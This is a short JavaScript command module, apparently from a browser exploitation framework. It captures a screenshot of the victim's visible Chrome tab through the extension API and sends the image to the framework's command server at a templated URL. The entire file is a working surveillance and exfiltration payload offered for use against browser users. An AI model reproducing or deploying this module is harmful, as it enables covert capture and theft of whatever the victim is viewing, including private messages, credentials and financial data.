//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

    chrome.tabs.captureVisibleTab(null, function(img) {
        server.net.send('<%= @command_url %>', <%= @command_id %>, 'img: ' + img.toString());
    });
});

